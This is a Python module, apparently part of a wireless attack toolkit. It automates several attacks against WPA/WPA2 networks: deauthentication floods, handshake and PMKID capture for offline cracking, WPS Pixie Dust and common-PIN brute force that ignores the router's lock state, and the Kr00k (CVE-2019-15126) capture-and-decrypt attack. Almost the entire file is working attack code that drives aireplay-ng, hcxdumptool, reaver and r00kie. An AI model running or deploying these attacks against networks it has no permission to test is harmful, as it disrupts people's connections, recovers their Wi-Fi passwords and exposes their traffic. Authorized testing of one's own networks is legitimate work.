"""
WiFi Attacks - Handshake, PMKID, WPS, Deauth, Kr00k attacks.

Implements:
- HandshakeAttack: Deauth + capture (WPA/WPA2)
- PMKIDAttack: Client-less PMKID capture (WPA2/WPA3)
- WPSPixieAttack: Pixie Dust offline attack (reaver + pixiewps)
- WPSPinAttack: Common PIN dictionary attack
- DeauthAttack: Targeted/broadcast deauthentication
- Kr00kAttack: CVE-2019-15126 - All-zero key after disassociation
"""

import asyncio
import json
import os
import re
import structlog
import subprocess
import tempfile
import time
import uuid
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Callable

logger = structlog.get_logger(__name__)


class AttackStatus(Enum):
    PENDING = "pending"
    RUNNING = "running"
    SUCCESS = "success"
    FAILED = "failed"
    TIMEOUT = "timeout"
    CANCELLED = "cancelled"


@dataclass
class AttackResult:
    """Result of an attack execution."""
    attack_type: str
    target_bssid: str
    target_essid: Optional[str]
    status: AttackStatus
    started_at: datetime
    finished_at: Optional[datetime] = None
    output_files: List[str] = field(default_factory=list)
    handshake_path: Optional[str] = None
    pmkid_path: Optional[str] = None
    wps_pin: Optional[str] = None
    wps_psk: Optional[str] = None
    error_message: Optional[str] = None
    metadata: Dict[str, Any] = field(default_factory=dict)

    @property
    def duration_seconds(self) -> Optional[float]:
        if self.finished_at:
            return (self.finished_at - self.started_at).total_seconds()
        return None

    def to_dict(self) -> Dict[str, Any]:
        return {
            "attack_type": self.attack_type,
            "target_bssid": self.target_bssid,
            "target_essid": self.target_essid,
            "status": self.status.value,
            "started_at": self.started_at.isoformat(),
            "finished_at": self.finished_at.isoformat() if self.finished_at else None,
            "duration_seconds": self.duration_seconds,
            "output_files": self.output_files,
            "handshake_path": self.handshake_path,
            "pmkid_path": self.pmkid_path,
            "wps_pin": self.wps_pin,
            "wps_psk": self.wps_psk,
            "error_message": self.error_message,
            "metadata": self.metadata,
        }


class BaseAttack(ABC):
    """Abstract base class for WiFi attacks."""

    def __init__(
        self,
        interface: str,
        output_dir: str = "/var/lib/urban-hs/wifi_attacks",
        attack_timeout: int = 60,
    ):
        self.interface = interface
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.attack_timeout = attack_timeout
        self._running = False
        self._cancelled = False

    @abstractmethod
    async def execute(
        self,
        target_bssid: str,
        target_essid: Optional[str] = None,
        channel: int = 1,
        callback: Optional[Callable[[str], None]] = None,
    ) -> AttackResult:
        """Execute the attack against a target."""
        pass

    def _log(self, message: str, **kwargs) -> None:
        logger.info(message, **kwargs)

    def _notify_callback(self, callback: Optional[Callable[[str], None]], message: str) -> None:
        if callback:
            try:
                callback(message)
            except Exception:
                pass

    async def _start_airodump(
        self,
        bssid: str,
        channel: int,
        output_prefix: str,
    ) -> asyncio.subprocess.Process:
        """Start airodump-ng capture."""
        cmd = [
            "airodump-ng",
            "--bssid", bssid,
            "--channel", str(channel),
            "--write", output_prefix,
            "--output-format", "pcap",
            self.interface,
        ]
        
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        return proc

    async def _run_hcxdumptool(
        self,
        bssid: str,
        channel: int,
        output_file: Path,
        timeout: int,
    ) -> asyncio.subprocess.Process:
        """Run hcxdumptool for PMKID capture."""
        cmd = [
            "hcxdumptool",
            "-i", self.interface,
            "--filterlist_ap", bssid,
            "--filtermode", "2",
            "-c", str(channel),
            "-o", str(output_file),
        ]
        
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        return proc


class HandshakeAttack(BaseAttack):
    """
    WPA/WPA2 Handshake Capture Attack.
    
    Uses aireplay-ng to deauthenticate clients and airodump-ng to capture
    the 4-way handshake when they reconnect.
    """

    def __init__(
        self,
        interface: str,
        output_dir: str = "/var/lib/urban-hs/wifi_attacks/handshakes",
        attack_timeout: int = 60,
        deauth_count: int = 10,
    ):
        super().__init__(interface, output_dir, attack_timeout)
        self.deauth_count = deauth_count

    async def execute(
        self,
        target_bssid: str,
        target_essid: Optional[str] = None,
        channel: int = 1,
        callback: Optional[Callable[[str], None]] = None,
    ) -> AttackResult:
        result = AttackResult(
            attack_type="handshake",
            target_bssid=target_bssid,
            target_essid=target_essid,
            status=AttackStatus.RUNNING,
            started_at=datetime.utcnow(),
        )

        self._running = True
        self._cancelled = False

        # Setup output files
        safe_bssid = target_bssid.replace(":", "_")
        timestamp = int(time.time())
        base_name = f"hs_{safe_bssid}_{timestamp}"
        cap_file = self.output_dir / f"{base_name}.cap"
        handshake_file = self.output_dir / f"{base_name}_handshake.cap"

        result.output_files = [str(cap_file)]

        try:
            # Step 1: Start airodump-ng on target channel
            self._log("Starting airodump-ng capture", bssid=target_bssid, channel=channel)
            self._notify_callback(callback, f"Starting capture on channel {channel}")

            airodump_proc = await self._start_airodump(
                bssid=target_bssid,
                channel=channel,
                output_prefix=str(self.output_dir / base_name),
            )

            # Give airodump time to start
            await asyncio.sleep(2)

            # Step 2: Send deauthentication packets
            self._log("Sending deauth packets", count=self.deauth_count)
            self._notify_callback(callback, f"Sending {self.deauth_count} deauth packets")

            proc = await asyncio.create_subprocess_exec(
                "aireplay-ng",
                "-0", str(self.deauth_count),
                "-a", target_bssid,
                self.interface,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()

            # Wait for handshake or timeout
            self._log("Waiting for handshake", timeout=self.attack_timeout)
            self._notify_callback(callback, "Waiting for handshake...")

            try:
                await asyncio.wait_for(airodump_proc.wait(), timeout=self.attack_timeout)
            except asyncio.TimeoutError:
                self._log("Timeout reached, killing airodump")
                airodump_proc.terminate()
                try:
                    await asyncio.wait_for(airodump_proc.wait(), timeout=5)
                except asyncio.TimeoutError:
                    airodump_proc.kill()
                    await airodump_proc.wait()

            # Check if handshake was captured
            result.finished_at = datetime.utcnow()

            if cap_file.exists() and cap_file.stat().st_size > 0:
                # Verify handshake
                if await self._verify_handshake(str(cap_file)):
                    result.status = AttackStatus.SUCCESS
                    result.handshake_path = str(cap_file)
                    self._notify_callback(callback, "Handshake captured successfully!")
                else:
                    result.status = AttackStatus.FAILED
                    result.error_message = "No valid handshake in capture"
            else:
                result.status = AttackStatus.FAILED
                result.error_message = "No capture data"

        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error_message = str(e)
        finally:
            self._running = False

        result.finished_at = datetime.utcnow()
        return result

    async def _verify_handshake(self, cap_file: str) -> bool:
        """Verify if capture file contains valid handshake."""
        try:
            proc = await asyncio.create_subprocess_exec(
                "aircrack-ng", cap_file,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            output = stdout.decode()

            # Check for "1 handshake" or "4 handshake" in output
            return "handshake" in output.lower() and "1" in output
        except Exception:
            return False


class PMKIDAttack(BaseAttack):
    """
    PMKID Attack (Client-less WPA2/WPA3).
    
    Uses hcxdumptool to capture PMKID without requiring a connected client.
    Then converts to hashcat 22000 format using hcxpcapngtool.
    """

    def __init__(
        self,
        interface: str,
        output_dir: str = "/var/lib/urban-hs/wifi_attacks/pmkid",
        attack_timeout: int = 60,
    ):
        super().__init__(interface, output_dir, attack_timeout)

    async def execute(
        self,
        target_bssid: str,
        target_essid: Optional[str] = None,
        channel: int = 1,
        callback: Optional[Callable[[str], None]] = None,
    ) -> AttackResult:
        result = AttackResult(
            attack_type="pmkid",
            target_bssid=target_bssid,
            target_essid=target_essid,
            status=AttackStatus.RUNNING,
            started_at=datetime.utcnow(),
        )

        self._running = True

        safe_bssid = target_bssid.replace(":", "_")
        timestamp = int(time.time())
        base_name = f"pmkid_{target_bssid.replace(':', '_')}_{timestamp}"
        pcap_file = self.output_dir / f"{base_name}.pcapng"
        hash_file = self.output_dir / f"{base_name}.22000"

        result.output_files = [str(pcap_file)]

        try:
            self._log("Starting PMKID capture", bssid=target_bssid, channel=channel)
            self._notify_callback(callback, f"Starting PMKID capture on channel {channel}")

            # Run hcxdumptool
            proc = await self._run_hcxdumptool(
                bssid=target_bssid,
                channel=channel,
                output_file=pcap_file,
                timeout=self.attack_timeout,
            )

            self._log("hcxdumptool process started", pid=proc.pid)
            self._notify_callback(callback, f"PMKID capture started (PID: {proc.pid})")

            # Wait for capture to complete
            try:
                await asyncio.wait_for(proc.wait(), timeout=self.attack_timeout)
            except asyncio.TimeoutError:
                self._log("hcxdumptool timeout, killing process")
                proc.kill()
                await proc.wait()
                # Check if capture file has data even after timeout
                # Don't raise, continue to conversion
                self._log("hcxdumptool timeout, checking capture file anyway")
                # Don't raise, continue to see if we have data

            self._log("hcxdumptool process finished", returncode=proc.returncode)
            
            # Read stderr to see any errors
            if proc.stderr:
                stderr_data = await proc.stderr.read()
                if stderr_data:
                    self._log("hcxdumptool stderr", stderr=stderr_data.decode()[:500])

            # Convert to hashcat format
            if pcap_file.exists() and pcap_file.stat().st_size > 0:
                self._log("Converting PCAP to hashcat 22000 format")
                hash_result = await self._convert_to_hashcat(pcap_file, hash_file)
                
                if hash_result:
                    result.status = AttackStatus.SUCCESS
                    result.pmkid_path = str(hash_file)
                    result.output_files.append(str(hash_file))
                    self._notify_callback(callback, "PMKID captured and converted to hashcat format!")
                else:
                    result.status = AttackStatus.FAILED
                    result.error_message = "No PMKID found in capture"
            else:
                result.status = AttackStatus.FAILED
                result.error_message = "No capture data"

        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error_message = str(e)
        finally:
            self._running = False

        result.finished_at = datetime.utcnow()
        return result

    async def _convert_to_hashcat(self, pcap_file: Path, hash_file: Path) -> bool:
        """Convert PCAP to hashcat 22000 format using hcxpcapngtool."""
        try:
            cmd = ["hcxpcapngtool", "-o", str(hash_file), str(pcap_file)]
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()
            
            if proc.returncode == 0 and hash_file.exists():
                return True
            return False
        except Exception:
            return False


class WPSPixieAttack(BaseAttack):
    """
    WPS Pixie Dust Attack (Offline).
    
    Uses reaver with pixiewps to perform offline WPS PIN cracking.
    """

    def __init__(
        self,
        interface: str,
        output_dir: str = "/var/lib/urban-hs/wifi_attacks/wps",
        attack_timeout: int = 180,
    ):
        super().__init__(interface, output_dir, attack_timeout)

    async def execute(
        self,
        target_bssid: str,
        target_essid: Optional[str] = None,
        channel: int = 1,
        callback: Optional[Callable[[str], None]] = None,
    ) -> AttackResult:
        result = AttackResult(
            attack_type="wps_pixie",
            target_bssid=target_bssid,
            target_essid=target_essid,
            status=AttackStatus.RUNNING,
            started_at=datetime.utcnow(),
        )

        self._running = True
        safe_bssid = target_bssid.replace(":", "_")
        timestamp = int(time.time())
        base_name = f"wps_pixie_{safe_bssid}_{timestamp}"
        pcap_file = self.output_dir / f"{base_name}.pcap"

        result.output_files = [str(pcap_file)]

        try:
            self._log("Starting WPS Pixie Dust attack", bssid=target_bssid)
            self._notify_callback(callback, f"Starting WPS Pixie Dust attack on {target_bssid}")

            cmd = [
                "reaver",
                "-i", self.interface,
                "-b", target_bssid,
                "-c", str(channel),
                "-K", "1",  # Pixie Dust mode
                "-o", str(self.output_dir / f"{base_name}.log"),
                "-w",  # Ignore locked state
                "-d", "10",  # Delay
            ]

            if target_essid:
                cmd.extend(["-e", target_essid])

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            self._log("reaver process started", pid=proc.pid)
            self._notify_callback(callback, f"Reaver started (PID: {proc.pid})")

            try:
                await asyncio.wait_for(proc.wait(), timeout=self.attack_timeout * 3)
            except asyncio.TimeoutError:
                proc.kill()
                await proc.wait()

            result.finished_at = datetime.utcnow()

            # Parse output for PIN and PSK
            if proc.stdout:
                stdout_data = await proc.stdout.read()
                output = stdout_data.decode()
                
                pin_match = re.search(r"WPS PIN:\s*(\d+)", output)
                psk_match = re.search(r"WPA PSK:\s*(.+)", output)
                
                if pin_match:
                    result.wps_pin = pin_match.group(1)
                    result.status = AttackStatus.SUCCESS
                    self._notify_callback(callback, f"WPS PIN found: {result.wps_pin}")
                    
                    if psk_match:
                        result.wps_psk = psk_match.group(1)
                        self._notify_callback(callback, f"WPA PSK found: {result.wps_psk}")
                else:
                    result.status = AttackStatus.FAILED
                    if proc.stderr:
                        stderr_data = await proc.stderr.read()
                        result.error_message = stderr_data.decode()[:500]

        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error_message = str(e)
        finally:
            self._running = False

        return result


class WPSPinAttack(BaseAttack):
    """
    WPS Common PIN Dictionary Attack.
    
    Uses known common PINs for various manufacturers.
    """

    OUI_PINS = {
        "00:1a:2b": ["12345670", "00000000", "11111111"],
        "00:1b:2c": ["12345670", "00000000", "22222222"],
    }

    def __init__(
        self,
        interface: str,
        output_dir: str = "/var/lib/urban-hs/wifi_attacks/wps",
        attack_timeout: int = 300,
    ):
        super().__init__(interface, output_dir, attack_timeout)

    async def execute(
        self,
        target_bssid: str,
        target_essid: Optional[str] = None,
        channel: int = 1,
        callback: Optional[Callable[[str], None]] = None,
    ) -> AttackResult:
        result = AttackResult(
            attack_type="wps_pin",
            target_bssid=target_bssid,
            target_essid=target_essid,
            status=AttackStatus.RUNNING,
            started_at=datetime.utcnow(),
        )

        self._running = True

        # Get OUI prefix (first 3 bytes)
        oui = target_bssid[:8].lower()
        pins = self.OUI_PINS.get(oui, ["12345670", "00000000", "11111111", "22222222", "33333333"])
        
        safe_bssid = target_bssid.replace(":", "_")
        timestamp = int(time.time())
        base_name = f"wps_pin_{safe_bssid}_{timestamp}"

        try:
            self._log("Starting WPS PIN attack", bssid=target_bssid, pins=len(pins))
            self._notify_callback(callback, f"Trying {len(pins)} common PINs")

            for pin in pins:
                if not self._running:
                    break
                
                cmd = [
                    "reaver",
                    "-i", self.interface,
                    "-b", target_bssid,
                    "-c", str(channel),
                    "-p", pin,
                    "-o", str(self.output_dir / f"{base_name}_{pin}.log"),
                ]

                if target_essid:
                    cmd.extend(["-e", target_essid])

                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )

                try:
                    await asyncio.wait_for(proc.wait(), timeout=60)
                    
                    if proc.stdout:
                        stdout_data = await proc.stdout.read()
                        output = stdout_data.decode()
                        psk_match = re.search(r"WPA PSK:\s*(.+)", output)
                        if psk_match:
                            result.wps_pin = pin
                            result.wps_psk = psk_match.group(1)
                            result.status = AttackStatus.SUCCESS
                            self._notify_callback(callback, f"WPS PIN found: {pin}, PSK: {result.wps_psk}")
                            break
                
                except asyncio.TimeoutError:
                    proc.kill()
                    await proc.wait()
                    continue

            result.finished_at = datetime.utcnow()

            if result.status != AttackStatus.SUCCESS:
                result.status = AttackStatus.FAILED
                result.error_message = "No valid PIN found in dictionary"

        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error_message = str(e)
        finally:
            self._running = False

        return result


class DeauthAttack(BaseAttack):
    """
    Deauthentication Attack.
    
    Uses aireplay-ng to send deauthentication packets.
    Can target specific clients (targeted) or broadcast (all clients).
    """

    def __init__(
        self,
        interface: str,
        output_dir: str = "/var/lib/urban-hs/wifi_attacks/deauth",
        attack_timeout: int = 30,
    ):
        super().__init__(interface, output_dir, attack_timeout)

    async def execute(
        self,
        target_bssid: str,
        target_essid: Optional[str] = None,
        channel: int = 1,
        callback: Optional[Callable[[str], None]] = None,
        **kwargs,
    ) -> AttackResult:
        """Execute deauth attack.
        
        Additional kwargs:
            client_mac: Specific client to deauth (None = broadcast)
            count: Number of deauth packets to send
        """
        client_mac = kwargs.get("client_mac")
        count = kwargs.get("count", 10)
        
        result = AttackResult(
            attack_type="deauth",
            target_bssid=target_bssid,
            target_essid=target_essid,
            status=AttackStatus.RUNNING,
            started_at=datetime.utcnow(),
            metadata={
                "client_mac": client_mac,
                "deauth_count": count,
                "targeted": client_mac is not None,
            },
        )

        try:
            self._log("Starting deauth attack", bssid=target_bssid, client=client_mac, count=count)
            self._notify_callback(callback, f"Sending {count} deauth packets to {client_mac or 'broadcast'}")

            cmd = [
                "aireplay-ng",
                "-0", str(count),
                "-a", target_bssid,
            ]

            if client_mac:
                cmd.extend(["-c", client_mac])

            if target_essid:
                cmd.extend(["-e", target_essid])

            cmd.append(self.interface)

            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )

            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)

            result.finished_at = datetime.utcnow()
            result.output_files = []

            if proc.returncode == 0:
                result.status = AttackStatus.SUCCESS
                self._notify_callback(callback, f"Deauth sent successfully to {client_mac or 'all clients'}")
            else:
                result.status = AttackStatus.FAILED
                stderr_str = stderr.decode()
                result.error_message = stderr_str
                self._notify_callback(callback, f"Deauth failed: {stderr_str}")

        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error_message = str(e)
        finally:
            self._running = False

        return result


# ============================================================
# Kr00k Attack - CVE-2019-15126
# ============================================================

class Kr00kAttack(BaseAttack):
    """
    Kr00k Attack (CVE-2019-15126).
    
    Exploits Broadcom and Cypress WiFi chips that use an all-zero 
    encryption key after disassociation. Allows decryption of 
    WPA2-CCMP traffic after disassociation event.
    
    Attack flow:
    1. Deauthenticate target client to force disassociation
    2. Capture traffic immediately after disassociation
    3. Identify frames encrypted with all-zero key (TK=0x00...)
    4. Decrypt frames using r00kie-kr00kie or custom decryptor
    
    Vulnerable hardware: Broadcom BCM43xx, Cypress CYW43xxx chips
    Affected devices: Many IoT devices, Raspberry Pi, smartphones, laptops
    """
    
    def __init__(
        self,
        interface: str,
        output_dir: str = "/var/lib/urban-hs/wifi_attacks/kr00k",
        attack_timeout: int = 60,
        deauth_count: int = 10,
        capture_after_deauth: int = 10,  # seconds to capture after deauth
    ):
        super().__init__(interface, output_dir, attack_timeout)
        self.deauth_count = deauth_count
        self.capture_after_deauth = capture_after_deauth
        self.deauth_attack = DeauthAttack(interface, attack_timeout=30)

    async def execute(
        self,
        target_bssid: str,
        target_essid: Optional[str] = None,
        channel: int = 1,
        callback: Optional[Callable[[str], None]] = None,
        **kwargs,
    ) -> AttackResult:
        """Execute Kr00k attack."""
        client_mac = kwargs.get("client_mac")
        
        result = AttackResult(
            attack_type="kr00k",
            target_bssid=target_bssid,
            target_essid=target_essid,
            status=AttackStatus.RUNNING,
            started_at=datetime.utcnow(),
            metadata={
                "client_mac": client_mac,
                "deauth_count": self.deauth_count,
                "capture_duration": self.capture_after_deauth,
                "targeted_client": client_mac is not None,
            },
        )
        
        self._running = True
        
        safe_bssid = target_bssid.replace(":", "_")
        timestamp = int(time.time())
        base_name = f"kr00k_{target_bssid.replace(':', '_')}_{timestamp}"
        cap_file = self.output_dir / f"{base_name}.cap"
        decrypted_dir = self.output_dir / f"{base_name}_decrypted"
        decrypted_dir.mkdir(parents=True, exist_ok=True)
        
        result.output_files = [str(cap_file), str(decrypted_dir)]
        
        try:
            self._log("Starting Kr00k attack", bssid=target_bssid, channel=channel)
            self._notify_callback(callback, f"Starting Kr00k attack on channel {channel}")
            
            # Step 1: Start capture BEFORE deauth
            self._log("Starting airodump-ng capture for Kr00k", bssid=target_bssid, channel=channel)
            airodump_proc = await self._start_airodump(
                bssid=target_bssid,
                channel=channel,
                output_prefix=str(self.output_dir / base_name),
            )
            
            # Give airodump time to start
            await asyncio.sleep(2)
            
            # Step 2: Send deauth packets to force disassociation
            self._log("Sending deauth packets for Kr00k", count=self.deauth_count)
            self._notify_callback(callback, f"Sending {self.deauth_count} deauth packets")
            
            deauth_result = await self.deauth_attack.execute(
                target_bssid=target_bssid,
                target_essid=target_essid,
                channel=channel,
                callback=callback,
                client_mac=client_mac,
                count=self.deauth_count,
            )
            
            if deauth_result.status != AttackStatus.SUCCESS:
                self._log("Deauth failed, continuing capture anyway")
            
            # Step 3: Capture traffic after disassociation (Kr00k window)
            self._log("Capturing post-disassociation traffic for Kr00k window", duration=self.capture_after_deauth)
            self._notify_callback(callback, f"Capturing for {self.capture_after_deauth}s after disassociation")
            
            await asyncio.sleep(self.capture_after_deauth)
            
            # Stop capture
            airodump_proc.terminate()
            try:
                await asyncio.wait_for(airodump_proc.wait(), timeout=5)
            except asyncio.TimeoutError:
                airodump_proc.kill()
                await airodump_proc.wait()
            
            # Step 4: Analyze capture for Kr00k vulnerability
            self._log("Analyzing capture for Kr00k vulnerability")
            kr00k_frames = await self._analyze_kr00k(cap_file)
            
            if kr00k_frames > 0:
                result.status = AttackStatus.SUCCESS
                result.metadata["kr00k_frames_found"] = kr00k_frames
                self._notify_callback(callback, f"Kr00k vulnerability confirmed: {kr00k_frames} frames with all-zero key")
            else:
                result.status = AttackStatus.FAILED
                result.metadata["kr00k_frames_found"] = 0
                self._notify_callback(callback, "No Kr00k vulnerable frames found")
            
            # Step 5: Attempt decryption if r00kie-kr00kie available
            if kr00k_frames > 0:
                decrypted = await self._decrypt_kr00k(cap_file, decrypted_dir)
                if decrypted:
                    result.output_files.extend(decrypted)
                    result.metadata["decrypted_files"] = len(decrypted)
            
            result.finished_at = datetime.utcnow()
            
        except Exception as e:
            result.status = AttackStatus.FAILED
            result.error_message = str(e)
            self._log("Kr00k attack failed", error=str(e))
        finally:
            self._running = False
        
        return result

    async def _analyze_kr00k(self, cap_file: Path) -> int:
        """
        Analyze capture for frames encrypted with all-zero key.
        
        Uses tshark to extract CCMP frames and checks for zero key.
        """
        if not cap_file.exists():
            return 0
        
        try:
            # Use tshark to extract CCMP frames with key info
            cmd = [
                "tshark", "-r", str(cap_file),
                "-Y", "wlan.fc.type == 2 and wlan_ccmp",  # Data frames with CCMP
                "-T", "fields",
                "-e", "wlan.sa",
                "-e", "wlan.da",
                "-e", "wlan_ccmp.key",
                "-e", "frame.number",
            ]
            
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            
            kr00k_count = 0
            output = stdout.decode()
            zero_key = "00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00"
            
            for line in output.strip().split("\n"):
                if zero_key in line:
                    kr00k_count += 1
            
            return kr00k_count
            
        except Exception as e:
            self._log("Kr00k analysis failed", error=str(e))
            return 0

    async def _decrypt_kr00k(self, cap_file: Path, output_dir: Path) -> Optional[List[str]]:
        """
        Attempt to decrypt Kr00k frames using r00kie-kr00kie tool.
        
        Returns list of decrypted file paths.
        """
        try:
            # Check if r00kie-kr00kie is available
            import shutil
            if not shutil.which("r00kie"):
                self._log("r00kie not available, skipping decryption")
                return None
            
            output_file = output_dir / "kr00k_decrypted.pcap"
            cmd = ["r00kie", "-i", str(cap_file), "-o", str(output_file)]
            
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()
            
            if proc.returncode == 0 and output_file.exists():
                self._log("Kr00k decryption successful", output_file=str(output_file))
                return [str(output_file)]
            
            return None
            
        except Exception as e:
            self._log("Kr00k decryption failed", error=str(e))
            return None
